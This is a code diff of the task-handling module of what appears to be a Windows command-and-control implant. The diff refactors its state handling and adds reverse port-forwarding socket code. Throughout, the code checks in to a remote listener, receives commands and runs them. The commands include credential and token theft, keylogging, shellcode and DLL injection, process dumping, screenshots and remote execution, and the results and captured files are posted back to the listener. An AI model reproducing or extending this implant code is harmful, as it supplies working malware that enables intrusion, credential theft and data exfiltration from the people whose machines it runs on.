@@ -2,22 +2,44 @@
 
 namespace Handler
 {
-    std::wstring GetInitialInfo(State::StateManager& sm)
+    VOID HTTPInit(State::PState pState)
+    {
+		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
+            pState->pProcs,
+            pState->lpListenerHost,
+            pState->nListenerPort
+        );
+
+        pState->hSession = handlers.hSession;
+        pState->hConnect = handlers.hConnect;
+    }
+
+    VOID HTTPClose(State::PState pState)
+    {
+        System::Http::WinHttpCloseHandles(
+            pState->pProcs,
+            pState->hSession,
+            pState->hConnect,
+            pState->hRequest
+        );
+    }
+
+    std::wstring GetInitialInfoJSON(State::PState pState)
     {
         std::wstring wOS = L"windows";
         std::wstring wArch = L"";
         std::wstring wHostname = L"";
         std::wstring wListenerURL = L"";
-        std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(sm.GetSleep()));
-        std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(sm.GetJitter()));
-        std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(sm.GetKillDate()));
+        std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(pState->nSleep));
+        std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(pState->nJitter));
+        std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(pState->nKillDate));
 
         // Get listener URL
-        wListenerURL += std::wstring(sm.GetListenerProtocol());
+        wListenerURL += std::wstring(pState->lpListenerProto);
         wListenerURL += L"://";
-        wListenerURL +=	std::wstring(sm.GetListenerHost());
+        wListenerURL +=	std::wstring(pState->lpListenerHost);
         wListenerURL +=	L":";
-        wListenerURL +=	Utils::Convert::UTF8Decode(std::to_string(sm.GetListenerPort()));
+        wListenerURL +=	Utils::Convert::UTF8Decode(std::to_string(pState->nListenerPort));
 
         // Get architecture
         SYSTEM_INFO systemInfo;
@@ -43,7 +65,7 @@ namespace Handler
         wJson += L",";
         wJson += L"\"listenerURL\":\"" + wListenerURL + L"\"";
         wJson += L",";
-        wJson += L"\"implantType\":\"" + std::wstring(sm.GetPayloadType()) + L"\"";
+        wJson += L"\"implantType\":\"" + std::wstring(pState->lpPayloadType) + L"\"";
         wJson += L",";
         wJson += L"\"sleep\":" + wSleep + L"";
         wJson += L",";
@@ -55,37 +77,19 @@ namespace Handler
         return wJson;
     }
 
-    VOID InitHTTP(State::StateManager& sm)
-    {
-		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
-			sm.GetListenerHost(),
-			sm.GetListenerPort()
-		);
-        sm.SetHSession(handlers.hSession);
-        sm.SetHConnect(handlers.hConnect);
-    }
-
-    VOID CloseHTTP(State::StateManager& sm)
-    {
-        System::Http::WinHttpCloseHandles(
-            sm.GetHSession(),
-            sm.GetHConnect(),
-            sm.GetHRequest()
-        );
-    }
-
-    // If success, get the agent UUID. This value will be used for subsequent processes.
+    // If success, gets the agent UUID. This value will be used for subsequent processes.
     BOOL CheckIn(
-        State::StateManager& sm,
+        State::PState pState,
         const std::wstring& wInfoJson
     ) {
         std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
-            sm.GetHConnect(),
-            sm.GetListenerHost(),
-            sm.GetListenerPort(),
-            sm.GetReqPathCheckIn(),
+            pState->pProcs,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathCheckIn,
             L"POST",
             L"Content-Type: application/json\r\n",
             (LPVOID)sInfoJson.c_str(),
@@ -97,21 +101,21 @@ namespace Handler
         }
 
         // Receive the agent UUID.
-        std::wstring uuid = System::Http::ReadResponseText(resp.hRequest);
-        sm.SetUUID(uuid);
+        pState->wUUID = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
         
         return TRUE;
     }
 
-    BOOL GetTask(State::StateManager& sm)
+    BOOL TaskGet(State::PState pState)
     {
-        std::wstring wHeader = L"X-UUID: " + sm.GetUUID() + L"\r\n";
+        std::wstring wHeader = L"X-UUID: " + pState->wUUID + L"\r\n";
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
-            sm.GetHConnect(),
-            sm.GetListenerHost(),
-            sm.GetListenerPort(),
-            sm.GetReqPathTaskGet(),
+            pState->pProcs,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathTaskGet,
             L"GET",
             wHeader.c_str(),
             NULL,
@@ -122,29 +126,28 @@ namespace Handler
             return FALSE;
         }
 
-        sm.SetHRequest(resp.hRequest);
+        pState->hRequest = resp.hRequest;
 
-        std::wstring task = System::Http::ReadResponseText(resp.hRequest);
-        sm.SetTask(task);
+        pState->wTask = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
 
         return TRUE;
     }
 
-    BOOL ExecuteTask(State::StateManager& sm)
+    BOOL TaskExecute(State::PState pState)
     {
-        std::wstring task = sm.GetTask();
+        std::wstring task = pState->wTask;
 
         if (wcscmp(task.substr(0, 4).c_str(), L"cat ") == 0)
         {
-            sm.SetTaskResult(Task::Cat(task.substr(4, task.size())));
+            pState->wTaskResult = Task::Cat(task.substr(4, task.size()));
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"cd ") == 0)
         {
-            sm.SetTaskResult(Task::Cd(task.substr(3, task.size())));
+            pState->wTaskResult = Task::Cd(task.substr(3, task.size()));
         }
         else if (wcscmp(task.substr(0, 8).c_str(), L"connect ") == 0)
         {
-            sm.SetTaskResult(Task::Connect(sm, task.substr(8, task.size())));
+            pState->wTaskResult = Task::Connect(pState, task.substr(8, task.size()));
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
         {
@@ -155,11 +158,11 @@ namespace Handler
                 return FALSE;
             }
 
-            sm.SetTaskResult(Task::Cp(wArgs[1], wArgs[2]));
+            pState->wTaskResult = Task::Cp(wArgs[1], wArgs[2]);
         }
         else if (wcscmp(task.c_str(), L"creds steal") == 0)
         {
-            sm.SetTaskResult(Task::CredsSteal());
+            pState->wTaskResult = Task::CredsSteal();
         }
         else if (wcscmp(task.substr(0, 4).c_str(), L"dll ") == 0)
         {
@@ -175,7 +178,7 @@ namespace Handler
                 wDllSrc += wArgs[i];
             }
 
-            sm.SetTaskResult(Task::Dll(sm, wArgs[1], wDllSrc));
+            pState->wTaskResult = Task::Dll(pState, wArgs[1], wDllSrc);
         }
         else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
         {
@@ -186,43 +189,47 @@ namespace Handler
                 return FALSE;
             }
 
-            sm.SetTaskResult(Task::Download(sm, wArgs[1], wArgs[2]));
+            pState->wTaskResult = Task::Download(pState, wArgs[1], wArgs[2]);
+        }
+        else if (wcscmp(task.c_str(), L"env") == 0)
+        {
+            pState->wTaskResult = Task::EnvLs();
         }
         else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
         {
-            sm.SetTaskResult(Task::Execute(task.substr(8, task.size())));
+            pState->wTaskResult = Task::Execute(task.substr(8, task.size()));
         }
         else if (wcscmp(task.c_str(), L"groups") == 0)
         {
-            sm.SetTaskResult(Task::Groups());
+            pState->wTaskResult = Task::Groups();
         }
         else if (wcscmp(task.c_str(), L"history") == 0)
         {
-            sm.SetTaskResult(Task::History());
+            pState->wTaskResult = Task::History();
         }
         else if (wcscmp(task.c_str(), L"ip") == 0)
         {
-            sm.SetTaskResult(Task::Ip());
+            pState->wTaskResult = Task::Ip();
         }
         else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
         {
-            sm.SetTaskResult(Task::KeyLog(task.substr(7, task.size())));
+            pState->wTaskResult = Task::KeyLog(task.substr(7, task.size()));
         }
         else if (wcscmp(task.c_str(), L"kill") == 0)
         {
-            sm.SetTaskResult(Task::Kill());
+            pState->wTaskResult = Task::Kill(pState);
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
         {
-            sm.SetTaskResult(Task::Ls(task.substr(3, task.size())));
+            pState->wTaskResult = Task::Ls(task.substr(3, task.size()));
         }
         else if (wcscmp(task.substr(0, 8).c_str(), L"migrate ") == 0)
         {
-            sm.SetTaskResult(Task::Migrate(task.substr(8, task.size())));
+            pState->wTaskResult = Task::Migrate(task.substr(8, task.size()));
         }
         else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
         {
-            sm.SetTaskResult(Task::Mkdir(task.substr(6, task.size())));
+            pState->wTaskResult = Task::Mkdir(task.substr(6, task.size()));
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
         {
@@ -233,27 +240,27 @@ namespace Handler
                 return FALSE;
             }
 
-            sm.SetTaskResult(Task::Mv(wArgs[1], wArgs[2]));
+            pState->wTaskResult = Task::Mv(wArgs[1], wArgs[2]);
         }
         else if (wcscmp(task.c_str(), L"net") == 0)
         {
-            sm.SetTaskResult(Task::Net());
+            pState->wTaskResult = Task::Net();
         }
         else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
         {
-            sm.SetTaskResult(Task::Procdump(task.substr(9, task.size())));
+            pState->wTaskResult = Task::Procdump(task.substr(9, task.size()));
         }
         else if (wcscmp(task.c_str(), L"ps") == 0)
         {
-            sm.SetTaskResult(Task::Ps());
+            pState->wTaskResult = Task::Ps();
         }
         else if (wcscmp(task.substr(0, 8).c_str(), L"ps kill ") == 0)
         {
-            sm.SetTaskResult(Task::PsKill(task.substr(8, task.size())));
+            pState->wTaskResult = Task::PsKill(task.substr(8, task.size()));
         }
         else if (wcscmp(task.c_str(), L"pwd") == 0)
         {
-            sm.SetTaskResult(Task::Pwd());
+            pState->wTaskResult = Task::Pwd();
         }
         else if (wcscmp(task.substr(0, 12).c_str(), L"reg subkeys ") == 0)
         {
@@ -271,7 +278,7 @@ namespace Handler
                 wSubKey += wArgs[i];
             }
 
-            sm.SetTaskResult(Task::RegSubKeys(wRootKey, wSubKey, bRecurse));
+            pState->wTaskResult = Task::RegSubKeys(wRootKey, wSubKey, bRecurse);
         }
         else if (wcscmp(task.substr(0, 11).c_str(), L"reg values ") == 0)
         {
@@ -289,26 +296,30 @@ namespace Handler
                 wSubKey += wArgs[i];
             }
 
-            sm.SetTaskResult(Task::RegValues(wRootKey, wSubKey, bRecurse));
+            pState->wTaskResult = Task::RegValues(wRootKey, wSubKey, bRecurse);
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
         {
-            sm.SetTaskResult(Task::Rm(task.substr(3, task.size())));
+            pState->wTaskResult = Task::Rm(task.substr(3, task.size()));
         }
         else if (wcscmp(task.substr(0, 6).c_str(), L"rmdir ") == 0)
         {
-            sm.SetTaskResult(Task::Rmdir(task.substr(6, task.size())));
+            pState->wTaskResult = Task::Rmdir(task.substr(6, task.size()));
         }
         else if (wcscmp(task.substr(0, 13).c_str(), L"rportfwd add ") == 0)
         {
             // Parse arguments.
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 5)
+            if (wArgs.size() != 6)
             {
                 return FALSE;
             }
 
-            sm.SetTaskResult(Task::RportfwdAdd(sm, wArgs[2], wArgs[3], wArgs[4]));
+            pState->wTaskResult = Task::RportfwdAdd(pState, wArgs[2], wArgs[3], wArgs[4], wArgs[5]);
+        }
+        else if (wcscmp(task.substr(0, 11).c_str(), L"rportfwd ls") == 0)
+        {
+            pState->wTaskResult = Task::RportfwdLs(pState);
         }
         else if (wcscmp(task.substr(0, 12).c_str(), L"rportfwd rm ") == 0)
         {
@@ -319,7 +330,7 @@ namespace Handler
                 return FALSE;
             }
 
-            sm.SetTaskResult(Task::RportfwdRm(wArgs[2], wArgs[3]));
+            pState->wTaskResult = Task::RportfwdRm(wArgs[2], wArgs[3]);
         }
         else if (wcscmp(task.substr(0, 6).c_str(), L"runas ") == 0)
         {
@@ -337,15 +348,15 @@ namespace Handler
                 wCmd += wArgs[i];
             }
 
-            sm.SetTaskResult(Task::RunAs(wUser, wPassword, wCmd));
+            pState->wTaskResult = Task::RunAs(wUser, wPassword, wCmd);
         }
         else if (wcscmp(task.c_str(), L"screenshot") == 0)
         {
             // Is DLL implant, the screenshot feature is not available.
             #ifndef IS_DLL
-            sm.SetTaskResult(Task::Screenshot(sm));
+            pState->wTaskResult = Task::Screenshot(pState);
             #else
-            sm.SetTaskResult(L"Cannot take a screenshot on DLL.");
+            pState->wTaskResult = L"Cannot take a screenshot on DLL";
             #endif
         }
         else if (wcscmp(task.substr(0, 10).c_str(), L"shellcode ") == 0)
@@ -363,15 +374,15 @@ namespace Handler
                 wSrc += wArgs[i];
             }
 
-            sm.SetTaskResult(Task::Shellcode(sm, wArgs[1], wSrc));
+            pState->wTaskResult = Task::Shellcode(pState, wArgs[1], wSrc);
         }
         else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
         {
-            sm.SetTaskResult(Task::Sleep(sm, task.substr(6, task.size())));
+            pState->wTaskResult = Task::Sleep(pState, task.substr(6, task.size()));
         }
         else if (wcscmp(task.c_str(), L"token revert") == 0)
         {
-            sm.SetTaskResult(Task::TokenRevert());
+            pState->wTaskResult = Task::TokenRevert();
         }
         else if (wcscmp(task.substr(0, 12).c_str(), L"token steal ") == 0)
         {
@@ -382,7 +393,7 @@ namespace Handler
                 return FALSE;
             }
 
-            sm.SetTaskResult(Task::TokenSteal(wArgs[2], wArgs[3]));
+            pState->wTaskResult = Task::TokenSteal(wArgs[2], wArgs[3]);
         }
         else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
         {
@@ -393,53 +404,56 @@ namespace Handler
                 return FALSE;
             }
 
-            sm.SetTaskResult(Task::Upload(sm, wArgs[1], wArgs[2]));
+            pState->wTaskResult = Task::Upload(pState, wArgs[1], wArgs[2]);
         }
         else if (wcscmp(task.c_str(), L"users") == 0)
         {
-            sm.SetTaskResult(Task::Users());
+            pState->wTaskResult = Task::Users();
         }
         else if (wcscmp(task.c_str(), L"whoami") == 0)
         {
-            sm.SetTaskResult(Task::Whoami());
+            pState->wTaskResult = Task::Whoami();
         }
         else if (wcscmp(task.c_str(), L"whoami priv") == 0)
         {
-            sm.SetTaskResult(Task::WhoamiPriv());
+            pState->wTaskResult = Task::WhoamiPriv();
         }
         else
         {
-            sm.SetTaskResult(L"Error: Invalid task.");
+            pState->wTaskResult = L"Error: Invalid task.";
         }
 
         return TRUE;
     }
 
-    BOOL SendTaskResult(State::StateManager& sm)
+    BOOL TaskResultSend(State::PState pState)
     {
         System::Http::WinHttpResponse resp;
 
         // Prepare additional headers
         std::wstring wHeaders;
-        wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n" + L"X-Task: " + sm.GetTask() + L"\r\n";
+        wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n" + L"X-Task: " + pState->wTask + L"\r\n";
 
         // When the "procdump" and "screenshot" tasks,
         // read bytes of the captured image file and send them.
         if (
-            (wcscmp(sm.GetTask().substr(0, 9).c_str(), L"procdump ") == 0) ||
-            (wcscmp(sm.GetTask().c_str(), L"screenshot") == 0)
+            (wcscmp(pState->wTask.substr(0, 9).c_str(), L"procdump ") == 0) ||
+            (wcscmp(pState->wTask.c_str(), L"screenshot") == 0)
         ) {
-            // Load a captured image file
-            std::vector<char> fileData = System::Fs::ReadBytesFromFile(sm.GetTaskResult());
+            std::wstring wFilePath = pState->wTaskResult;
 
-            // Delete the temp procdump/image file
-            DeleteFile(sm.GetTaskResult().c_str());
+            // Read file data
+            std::vector<char> fileData = System::Fs::ReadBytesFromFile(wFilePath);
+
+            // Delete file
+            DeleteFile(wFilePath.c_str());
 
             resp = System::Http::SendRequest(
-                sm.GetHConnect(),
-                sm.GetListenerHost(),
-                sm.GetListenerPort(),
-                sm.GetReqPathTaskResult(),
+                pState->pProcs,
+                pState->hConnect,
+                pState->lpListenerHost,
+                pState->nListenerPort,
+                pState->lpReqPathTaskResult,
                 L"POST",
                 wHeaders.c_str(),
                 (LPVOID)fileData.data(),
@@ -449,13 +463,14 @@ namespace Handler
         else
         {
             // I couln't retrieve the `wstring` length correctly, so use `string` here.
-            std::string sTaskResult = Utils::Convert::UTF8Encode(sm.GetTaskResult());
+            std::string sTaskResult = Utils::Convert::UTF8Encode(pState->wTaskResult);
 
             resp = System::Http::SendRequest(
-                sm.GetHConnect(),
-                sm.GetListenerHost(),
-                sm.GetListenerPort(),
-                sm.GetReqPathTaskResult(),
+                pState->pProcs,
+                pState->hConnect,
+                pState->lpListenerHost,
+                pState->nListenerPort,
+                pState->lpReqPathTaskResult,
                 L"POST",
                 wHeaders.c_str(),
                 (LPVOID)sTaskResult.c_str(),
@@ -470,6 +485,149 @@ namespace Handler
 
         return TRUE;
     }
+
+    BOOL Task(State::PState pState)
+    {
+        if (Handler::TaskGet(pState))
+        {
+            Handler::TaskExecute(pState);
+            Handler::TaskResultSend(pState);
+            return TRUE;
+        }
+
+        return FALSE;
+    }
+
+    BOOL SocketAccept(State::PState pState)
+    {
+        Socket::PSOCKET_DATA pSocket = NULL;
+        Socket::PSOCKET_DATA pClientSocket  = NULL;
+        SOCKET clientSocket = 0;
+        u_long ulIOBlock = 1;
+
+        pSocket = pState->pSocket;
+        
+        while (true)
+        {
+            if (!pSocket)
+                break;
+
+            if (pSocket->bShouldRemove)
+            {
+                pSocket = pSocket->next;
+                continue;
+            }
+
+            // Accept connections
+            if (pSocket->dwType == SOCKET_TYPE_REVERSE_PORT_FORWARDING)
+            {
+                clientSocket = accept(pSocket->socket, NULL, NULL);
+                if (clientSocket != INVALID_SOCKET)
+                {
+                    if (ioctlsocket(clientSocket, FIONBIO, &ulIOBlock) != SOCKET_ERROR)
+                    {
+                        pClientSocket = Socket::NewSocket(
+                            SOCKET_TYPE_CLIENT,
+                            pSocket->dwLIP,
+                            pSocket->dwLPort,
+                            pSocket->dwFwdIP,
+                            pSocket->dwFwdPort,
+                            pSocket->dwID
+                        );
+                        if (!pClientSocket)
+                        {
+                            continue;
+                        }
+
+                        // Send the socket open request.
+                        // System::Http::SendRequest(
+                        //     pState->hConnect,
+                        //     pState->lpListenerHost,
+                        //     pState->nListenerPort,
+                        //     ...
+                        // )
+                    }
+                }
+            }
+
+            pSocket = pSocket->next;
+        }
+
+        return TRUE;
+    }
+
+    // Reference:
+    // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/Socket.c#L281
+    BOOL SocketRead(State::PState pState)
+    {
+        Socket::PSOCKET_DATA pSocket = NULL;
+        PVOID newBuf = NULL;
+        char recvBuf[512];
+        int recvBufLen = 512;
+        BOOL bResult = FALSE;
+        int iResult, iSendResult;
+
+        pSocket = pState->pSocket;
+
+        while (true)
+        {
+            if (!pSocket)
+                break;
+
+            if (pSocket->bShouldRemove)
+            {
+                pSocket = pSocket->next;
+                continue;
+            }
+
+            if (pSocket->dwType == SOCKET_TYPE_CLIENT)
+            {
+                // Read data from connected clients.
+                do
+                {
+                    iResult = recv(pSocket->socket, recvBuf, recvBufLen, 0);
+                    if (iResult > 0)
+                    {
+                        // Data received
+                        // ...
+
+                        
+                        // Send data to connected clients
+                        iSendResult = send(pSocket->socket, recvBuf, iResult, 0);
+                        if (iSendResult == SOCKET_ERROR)
+                        {
+                        }
+                    }
+                } while (iResult > 0);
+            }
+
+            pSocket = pSocket->next;
+        }
+
+        return TRUE;
+    }
+
+    //
+    // BOOL SocketClose(State::PState pState)
+    // {
+
+    // }
+
+    // Kill every dead/removed socket.
+    // BOOL SocketKill(State::PState pState)
+    // {
+
+    // }
+
+    BOOL Socket(State::PState pState)
+    {
+        SocketAccept(pState);
+        // SocketRead(pState);
+        // SocketKill(pState);
+
+        return TRUE;
+    }
 }
+
 
 
